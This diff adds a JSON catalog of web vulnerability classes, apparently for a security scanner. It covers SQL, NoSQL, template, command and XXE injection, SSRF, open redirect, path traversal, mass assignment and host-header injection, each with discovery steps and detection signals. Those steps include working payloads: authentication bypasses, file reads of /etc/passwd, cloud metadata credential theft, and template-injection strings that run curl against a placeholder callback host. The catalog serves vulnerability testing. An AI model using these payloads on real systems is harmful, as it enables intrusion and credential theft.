@@ -1,0 +1,267 @@
+[
+  {
+    "id": "sqli-error-based",
+    "name": "Error-Based SQL Injection",
+    "owasp_category": "A03:2021 Injection",
+    "frameworks": [
+      "agnostic"
+    ],
+    "description": "SQL metacharacters injected into form fields, URL parameters, cookies, or JSON bodies cause the database to surface error messages containing driver/version strings, table names, or stack traces in the HTTP response. The most common class of SQLi found in bug bounties due to its unambiguous signal.",
+    "runtime_discovery": "Fuzz every user-supplied input (GET/POST params, path segments, JSON keys, cookie values, HTTP headers that land in queries) with single-quote, double-quote, comment sequences (--,--, #), and stacked-query delimiters. Compare HTTP response body, status code, and content-length against the benign baseline.",
+    "detection_signal": "Response body contains DB-engine error strings: 'you have an error in your SQL syntax', 'ORA-00907', 'pg_query()', 'Unclosed quotation mark', 'SQLSTATE[42000]', 'Microsoft OLE DB Provider for SQL Server', or an HTTP 500 with a stack trace that names a DB library. Response content-length diverges meaningfully from the baseline.",
+    "active_probe": true,
+    "severity": "critical",
+    "prevalence": "common",
+    "slice": "injection-fuzz",
+    "uid": "injection-fuzz__sqli-error-based",
+    "class_hint": "sqli"
+  },
+  {
+    "id": "sqli-boolean-blind",
+    "name": "Boolean-Blind SQL Injection",
+    "owasp_category": "A03:2021 Injection",
+    "frameworks": [
+      "agnostic"
+    ],
+    "description": "The application silently alters the result set or page content based on a true/false SQL condition injected into a parameter, without producing visible errors. The canonical form appends ' AND 1=1-- (true) vs ' AND 1=2-- (false) and diffs the responses.",
+    "runtime_discovery": "For each fuzzable parameter, send three requests: benign, always-true condition appended (' AND '1'='1), always-false condition appended (' AND '1'='2). Compare body content, content-length, element counts, and DOM structure across the three responses.",
+    "detection_signal": "True-condition response is semantically identical to the benign baseline (same records rendered, same content-length \u00b1 a few bytes), while the false-condition response differs structurally (empty result set, 'no results found', zero-length list, missing DOM section). Consistent bifurcation across multiple parameter values confirms injection.",
+    "active_probe": true,
+    "severity": "critical",
+    "prevalence": "common",
+    "slice": "injection-fuzz",
+    "uid": "injection-fuzz__sqli-boolean-blind",
+    "class_hint": "sqli"
+  },
+  {
+    "id": "sqli-time-blind",
+    "name": "Time-Based Blind SQL Injection",
+    "owasp_category": "A03:2021 Injection",
+    "frameworks": [
+      "agnostic"
+    ],
+    "description": "The injected payload causes the database to sleep or perform a heavy operation, producing a measurable response-time delay. Works even when the app returns identical responses for true and false cases (e.g., always renders the same error page).",
+    "runtime_discovery": "Inject time-delay payloads into each parameter: MySQL: ' AND SLEEP(5)--, MSSQL: '; WAITFOR DELAY '0:0:5'--, PostgreSQL: '; SELECT pg_sleep(5)--. Record baseline RTT for each endpoint, then measure delta. Run at least 3 rounds per payload to filter network jitter.",
+    "detection_signal": "Response latency for the injected request exceeds baseline by \u22654 seconds in a statistically consistent manner (all 3 rounds delayed). Latency scales linearly with the sleep argument (1s, 3s, 5s). No change in response body or status code between injected and benign requests.",
+    "active_probe": true,
+    "severity": "critical",
+    "prevalence": "common",
+    "slice": "injection-fuzz",
+    "uid": "injection-fuzz__sqli-time-blind",
+    "class_hint": "sqli"
+  },
+  {
+    "id": "nosqli-operator-injection",
+    "name": "NoSQL Operator Injection (MongoDB / DocumentDB)",
+    "owasp_category": "A03:2021 Injection",
+    "frameworks": [
+      "Node.js",
+      "Express",
+      "Meteor",
+      "Django",
+      "Flask"
+    ],
+    "description": "MongoDB query operators ($gt, $ne, $where, $regex) injected via JSON body or query-string parameter notation bypass authentication or extract data without knowing credentials. Common in Node.js APIs that pass req.body directly into db.collection.find().",
+    "runtime_discovery": "For login forms and search endpoints accepting JSON, replace string field values with operator objects: {'username': {'$ne': ''}, 'password': {'$ne': ''}}. Also try query-string form: ?username[$ne]=&password[$ne]=. Observe whether the app logs in, returns a 200 with user data, or behaves differently than when correct credentials are supplied.",
+    "detection_signal": "HTTP 200 with a valid session cookie or auth token returned for the $ne payload when no valid credentials were sent. Alternatively, a search endpoint returns all documents instead of zero results when the $ne or $gt operator is injected into a filter field. Response body size is significantly larger than expected for a 'not found' case.",
+    "active_probe": true,
+    "severity": "critical",
+    "prevalence": "occasional",
+    "slice": "injection-fuzz",
+    "uid": "injection-fuzz__nosqli-operator-injection",
+    "class_hint": "nosqli"
+  },
+  {
+    "id": "ssti-template-injection",
+    "name": "Server-Side Template Injection (SSTI)",
+    "owasp_category": "A03:2021 Injection",
+    "frameworks": [
+      "Jinja2",
+      "Twig",
+      "FreeMarker",
+      "Pebble",
+      "Velocity",
+      "Handlebars",
+      "Mako"
+    ],
+    "description": "User-supplied input is embedded directly into a server-side template string and evaluated by the template engine. A math expression like {{7*7}} that returns 49 in the response confirms arbitrary expression evaluation, which typically escalates to RCE via engine-specific sandbox escapes.",
+    "runtime_discovery": "Inject polyglot probe strings into all user-visible text fields (search boxes, profile fields, feedback forms, email templates, report names): {{7*7}}, ${7*7}, #{7*7}, <#assign x=7*7>${x}, *{7*7}. Submit and inspect the rendered HTML response for the evaluated result (49). Use a secondary canary string to distinguish reflection from coincidence.",
+    "detection_signal": "The literal string '49' (or engine-specific evaluated output) appears in the response body in place of the probe expression. The expression is not echo-reflected verbatim \u2014 it has been evaluated. Confirmed by varying the multiplier (e.g., {{7*8}} yields 56) to rule out static content matches.",
+    "active_probe": true,
+    "severity": "critical",
+    "prevalence": "occasional",
+    "slice": "injection-fuzz",
+    "uid": "injection-fuzz__ssti-template-injection",
+    "class_hint": "ssti"
+  },
+  {
+    "id": "os-command-injection",
+    "name": "OS Command Injection",
+    "owasp_category": "A03:2021 Injection",
+    "frameworks": [
+      "agnostic"
+    ],
+    "description": "User input passed to a shell command without proper sanitization allows injection of additional OS commands via metacharacters (;, |, &&, $(), backticks). Common in features like ping/traceroute utilities, file conversion, image processing, DNS lookup, or report generation backed by shell calls.",
+    "runtime_discovery": "Inject shell metacharacters with time-delay payloads into parameters likely passed to OS commands (filename, host, ip, domain, format fields): ; sleep 5, | sleep 5, && sleep 5, $(sleep 5), `sleep 5`. Measure response latency delta vs baseline. For OOB confirmation, inject DNS callback payloads (ping -c1 <collaborator_host>) and monitor the listener.",
+    "detection_signal": "Time-delay: response latency consistently exceeds baseline by \u22654 seconds for sleep-based payloads. OOB: DNS or HTTP request received at the Burp Collaborator / interactsh listener with the app's source IP. Error-based: response contains shell output fragments like uid=, /etc/passwd lines, or Windows system directory listings when whoami/dir is injected.",
+    "active_probe": true,
+    "severity": "critical",
+    "prevalence": "occasional",
+    "slice": "injection-fuzz",
+    "uid": "injection-fuzz__os-command-injection",
+    "class_hint": "cmd-injection"
+  },
+  {
+    "id": "xxe-injection",
+    "name": "XML External Entity (XXE) Injection",
+    "owasp_category": "A03:2021 Injection",
+    "frameworks": [
+      "Java",
+      "PHP",
+      ".NET",
+      "Python (lxml)",
+      "Ruby (Nokogiri)"
+    ],
+    "description": "An XML parser configured to process external entity declarations allows attackers to read local files, perform SSRF, or trigger denial of service by embedding DOCTYPE declarations with SYSTEM or PUBLIC entity references in XML payloads.",
+    "runtime_discovery": "Identify endpoints that consume XML (file uploads, SOAP, XML API bodies, SVG uploads, DOCX/XLSX imports). Replace or inject a DOCTYPE block into the XML: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> and reference &xxe; in the body. Submit and inspect response. For blind XXE, use an out-of-band SYSTEM entity pointing to a Burp Collaborator HTTP URL.",
+    "detection_signal": "In-band: response body contains the contents of /etc/passwd (root:x:0:0:), /etc/hostname, or Windows system files. OOB: HTTP or DNS interaction received at the collaborator listener with the request originating from the app server's IP. Error-based: XML parser error message reveals local file path or network connectivity to internal hosts.",
+    "active_probe": true,
+    "severity": "critical",
+    "prevalence": "occasional",
+    "slice": "injection-fuzz",
+    "uid": "injection-fuzz__xxe-injection",
+    "class_hint": "ssrf"
+  },
+  {
+    "id": "ssrf-basic",
+    "name": "Server-Side Request Forgery (SSRF)",
+    "owasp_category": "A10:2021 Server-Side Request Forgery",
+    "frameworks": [
+      "agnostic"
+    ],
+    "description": "The application fetches a remote resource using a user-supplied URL without restricting the target. An attacker can redirect the server to internal metadata endpoints (169.254.169.254, fd00:ec2::254), internal services, or arbitrary external hosts, leaking credentials, tokens, or enabling lateral movement.",
+    "runtime_discovery": "Identify parameters that accept URLs or hostnames (webhook, avatar_url, callback, feed, import, preview, pdf_url, fetch). Substitute values with: (1) Burp Collaborator/interactsh URL to confirm OOB fetch, (2) http://169.254.169.254/latest/meta-data/ for cloud metadata, (3) http://localhost:6379/ for internal Redis, (4) http://[::1]:8080/admin for IPv6 loopback bypass.",
+    "detection_signal": "OOB: HTTP request received at collaborator listener from the app server IP. In-band: response body or error message contains cloud metadata content (ami-id, instance-type, IAM role credentials), internal service banners (Redis -ERR, SSH-2.0-), or internal IP addresses. Timing difference when requesting closed vs open internal ports (TCP connect timing oracle).",
+    "active_probe": true,
+    "severity": "critical",
+    "prevalence": "common",
+    "slice": "injection-fuzz",
+    "uid": "injection-fuzz__ssrf-basic",
+    "class_hint": "ssrf"
+  },
+  {
+    "id": "open-redirect",
+    "name": "Open Redirect",
+    "owasp_category": "A01:2021 Broken Access Control",
+    "frameworks": [
+      "agnostic"
+    ],
+    "description": "User-supplied URL values in redirect parameters (next, return, redirect_uri, continue, goto, url) are followed by the server without validation, enabling phishing and OAuth token theft via redirect_uri hijacking. A subset of cases involves JavaScript-URI redirects that execute script in the browser.",
+    "runtime_discovery": "Enumerate all redirect-like parameters in login flows, logout handlers, OAuth callbacks, and navigation links. Replace the value with an external URL (https://evil.example.com) and an OOB collaborator URL. Follow the redirect chain with a headless browser or intercept at the proxy level. Also try protocol-relative (//evil.example.com) and bypass encodings (%2F%2F, ///evil.example.com).",
+    "detection_signal": "HTTP 301/302/307 Location header points to an attacker-controlled domain. Or a meta-refresh tag or JavaScript window.location assignment in the response body contains the injected URL. For JavaScript URIs: Location: javascript:alert(1) received in a 302 response. OOB: HTTP request arrives at collaborator from browser/server after redirect is followed.",
+    "active_probe": true,
+    "severity": "medium",
+    "prevalence": "common",
+    "slice": "injection-fuzz",
+    "uid": "injection-fuzz__open-redirect",
+    "class_hint": "open-redirect"
+  },
+  {
+    "id": "path-traversal",
+    "name": "Path Traversal (Directory Traversal)",
+    "owasp_category": "A01:2021 Broken Access Control",
+    "frameworks": [
+      "agnostic"
+    ],
+    "description": "User-controlled filename or path parameters are concatenated onto a server-side base path without canonicalization, allowing traversal out of the intended directory using ../ sequences to read arbitrary files (config, credentials, source code).",
+    "runtime_discovery": "Fuzz filename, path, file, doc, resource, template, page, and similar parameters with traversal sequences: ../../../etc/passwd, ..%2F..%2F..%2Fetc%2Fpasswd, ....//....//etc/passwd, %252e%252e%252fetc%252fpasswd. Also test path segments in REST-style URLs (/files/../../etc/passwd). Use both Unix (/etc/passwd) and Windows (..\\..\\windows\\win.ini) targets.",
+    "detection_signal": "Response body contains file contents matching known system files: root:x:0:0: from /etc/passwd, [boot loader] from boot.ini, [extensions] from win.ini, or base64-encoded content of a source file. HTTP 200 with content-type text/plain or application/octet-stream for a traversal-based path. Response size differs substantially from the 404/error baseline.",
+    "active_probe": true,
+    "severity": "high",
+    "prevalence": "common",
+    "slice": "injection-fuzz",
+    "uid": "injection-fuzz__path-traversal",
+    "class_hint": "cmd-injection"
+  },
+  {
+    "id": "mass-assignment",
+    "name": "Mass Assignment / Parameter Binding",
+    "owasp_category": "A01:2021 Broken Access Control",
+    "frameworks": [
+      "Ruby on Rails",
+      "Laravel",
+      "Spring",
+      "ASP.NET MVC",
+      "Django REST Framework",
+      "Express"
+    ],
+    "description": "Frameworks that auto-bind HTTP request parameters to model attributes allow attackers to set privileged fields (role, is_admin, balance, verified, owner_id) not intended to be user-editable by simply including them in a POST/PUT/PATCH body or query string.",
+    "runtime_discovery": "Intercept account registration, profile update, and object-creation requests. Replay them with additional JSON/form fields: role=admin, is_admin=true, admin=1, group_id=1, balance=99999, verified=true, owner_id=<other_user_id>. Compare the application state after submission (re-fetch the profile/object) against the state before. Also probe nested objects: {user: {role: 'admin'}}.",
+    "detection_signal": "After replaying the modified request, the subsequent GET of the profile/object endpoint returns the injected field value (e.g., role: 'admin', balance: 99999). HTTP 200 response to the modified write request (no validation rejection). Auth-diff: re-fetching the resource as the same user now reveals elevated permissions or changed attribute values not achievable through the normal UI.",
+    "active_probe": true,
+    "severity": "high",
+    "prevalence": "common",
+    "slice": "injection-fuzz",
+    "uid": "injection-fuzz__mass-assignment",
+    "class_hint": "mass-assignment"
+  },
+  {
+    "id": "host-header-injection",
+    "name": "Host Header Injection",
+    "owasp_category": "A03:2021 Injection",
+    "frameworks": [
+      "agnostic"
+    ],
+    "description": "The application trusts the HTTP Host header for constructing password-reset URLs, generating absolute links, or routing requests to cache backends without validating it against an allowlist. Attackers can poison the host value to redirect password-reset tokens to an attacker-controlled domain or exploit web cache poisoning.",
+    "runtime_discovery": "On password-reset and email-verification flows, replay the request with a modified Host header (Host: evil.example.com) or supplementary headers (X-Forwarded-Host, X-Host, X-Original-Host, Forwarded: host=evil.example.com). Trigger a password-reset email to a test account and inspect the link domain. Also probe for cache poisoning by injecting a Host and observing whether the modified value is reflected in the response or stored in a cache.",
+    "detection_signal": "Password-reset or account-confirmation email contains a link pointing to the attacker-supplied host value instead of the legitimate domain. Alternatively: the HTTP response body or Location header reflects the injected Host value (X-Forwarded-Host reflection in an HTML link, canonical URL, or CORS header). Cache-poisoning variant: second request with a legitimate Host header returns a response containing the previously injected evil domain.",
+    "active_probe": true,
+    "severity": "high",
+    "prevalence": "common",
+    "slice": "injection-fuzz",
+    "uid": "injection-fuzz__host-header-injection",
+    "class_hint": "cmd-injection"
+  },
+  {
+    "id": "ssrf-cloud-metadata",
+    "name": "SSRF via Cloud Instance Metadata Endpoint",
+    "owasp_category": "A10:2021 Server-Side Request Forgery",
+    "frameworks": [
+      "AWS",
+      "GCP",
+      "Azure",
+      "DigitalOcean",
+      "agnostic"
+    ],
+    "description": "A specific, high-impact SSRF subcase where the app fetches user-supplied URLs and the server runs on a cloud provider with an IMDSv1-style metadata endpoint at 169.254.169.254 or the IPv6 equivalent. Successful exploitation returns IAM role credentials granting cloud account access.",
+    "runtime_discovery": "On any URL-fetching parameter, inject http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS), http://metadata.google.internal/computeMetadata/v1/ with Metadata-Flavor: Google header smuggled via SSRF, or http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure). Use DNS rebinding or URL parser confusion bypasses (http://[::ffff:169.254.169.254]/, http://169.254.169.254.nip.io/) when direct IP is blocked.",
+    "detection_signal": "Response body contains IAM credential JSON with keys AccessKeyId, SecretAccessKey, Token; GCP service account token with access_token; or Azure managed identity token with access_token. Even partial metadata exposure (instance-id, region, account-id) confirms the SSRF vector and indicates IMDSv2 is not enforced or bypassable.",
+    "active_probe": true,
+    "severity": "critical",
+    "prevalence": "occasional",
+    "slice": "injection-fuzz",
+    "uid": "injection-fuzz__ssrf-cloud-metadata",
+    "class_hint": "ssrf"
+  },
+  {
+    "id": "ssti-blind-oob",
+    "name": "Blind SSTI via Out-of-Band DNS/HTTP Callback",
+    "owasp_category": "A03:2021 Injection",
+    "frameworks": [
+      "Jinja2",
+      "FreeMarker",
+      "Pebble",
+      "Velocity",
+      "Groovy"
+    ],
+    "description": "Template injection in contexts where the evaluated output is never reflected in the HTTP response (email bodies, PDF generators, background report jobs, audit logs). The vulnerability is confirmed via an out-of-band DNS or HTTP interaction triggered by the injected expression.",
+    "runtime_discovery": "Inject OOB callback expressions into fields whose output is not immediately visible (email subject, report title, notification message, audit description): Jinja2: {{''.__class__.__mro__[1].__subclasses__()[X]('curl http://<collab>',shell=True,stdout=-1).communicate()}}, FreeMarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('curl http://<collab>')}. Monitor the Burp Collaborator/interactsh listener for HTTP/DNS interactions.",
+    "detection_signal": "HTTP or DNS request received at the out-of-band listener with source IP matching the app server within seconds of the probe submission. The request path or hostname contains a per-request nonce embedded in the payload, ruling out false positives from unrelated crawlers. No change in the HTTP response body or status is required for confirmation.",
+    "active_probe": true,
+    "severity": "critical",
+    "prevalence": "occasional",
+    "slice": "injection-fuzz",
+    "uid": "injection-fuzz__ssti-blind-oob",
+    "class_hint": "ssti"
+  }
+]
